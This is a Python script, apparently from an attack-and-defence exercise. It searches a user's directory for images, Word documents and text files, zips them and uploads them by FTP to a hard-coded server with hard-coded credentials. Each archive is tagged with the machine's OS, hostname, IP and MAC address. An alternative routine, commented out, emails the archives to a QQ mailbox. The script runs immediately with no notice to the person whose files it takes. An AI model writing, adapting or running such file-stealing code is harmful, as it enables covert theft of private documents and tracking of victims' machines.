import os
from ftplib import FTP
import zipfile
import socket
import uuid
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from email.mime.application import MIMEApplication

def search(path, name):
    anls=[]
    searchls=[path]
    long=len(name)
    while(len(searchls)!=0):
        for root, dirs, files in os.walk(searchls[0]):  # path 为根目录
            for file in files[long:]:
                if name in file:
                    anls.append(root+'/'+file)
            for dir in dirs:
                searchls.append(root+'/'+dir)
        searchls.remove(searchls[0])
    return anls

def zipfiles(dirpaths, outFullName):
    zip = zipfile.ZipFile(outFullName, "a", zipfile.ZIP_DEFLATED)
    for dirpath in dirpaths:
        zip.write(dirpath)
    zip.close()

def updata(ls,ip,user,passwd,name):
    ftp = FTP(ip)           #设置ftp服务器地址
    ftp.login(user, passwd)      #设置登录账户和密码
    ftp.storbinary('STOR %s' %name, open(ls, 'rb')) #上传文件

def mac():
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

def email(sendls,name):
    from_addr = '673665519@qq.com'
    to_addrs = '673665519@qq.com'
    qqCode = '*******'#邮箱授权码
    smtp_server = 'smtp.qq.com'
    smtp_port = 465  # 固定端口

    # 配置服务器
    stmp = smtplib.SMTP_SSL(smtp_server, smtp_port)
    stmp.login(from_addr, qqCode)

    # 组装发送内容
    message = MIMEMultipart()  # 发送的内容
    message['From'] = Header("xuhai", 'utf-8')  # 发件人
    message['To'] = Header('me', 'utf-8')  # 收件人
    subject = 'data'
    message['Subject'] = Header(subject, 'utf-8')  # 邮件标题
    message.attach(payload=MIMEText(_text="send data", _subtype="plain", _charset="utf-8"))

    part = MIMEApplication(open(sendls, 'rb').read())
    part.add_header('Content-Disposition', 'attachment', filename=name)
    message.attach(part)
    stmp.sendmail(from_addr, to_addrs, message.as_string())

def main():
    ip = '192.168.153.128'
    user = 'uftp'
    password = '123456'
    syst=os.name
    mymac=mac()
    myname=socket.getfqdn(socket.gethostname(  ))
    myaddr = socket.gethostbyname(myname)
    path="C:\\Users\\MSI\\Desktop\\攻防"
    namels =['.png','.jpg','.doc','.docx','.txt']
    for each in namels:
        tmp=search(path,each)
        if len(tmp)!=0:
            zipfiles(tmp,each[1:]+".zip")
            updata(each[1:]+".zip", ip, user, password,each[1:]+'('+syst+'_'+myname+'_'+myaddr+'_'+mymac+').zip')
            #邮件服务
            #email(each[1:]+".zip",each[1:]+'('+syst+'_'+myname+'_'+myaddr+'_'+mymac+').zip')
main()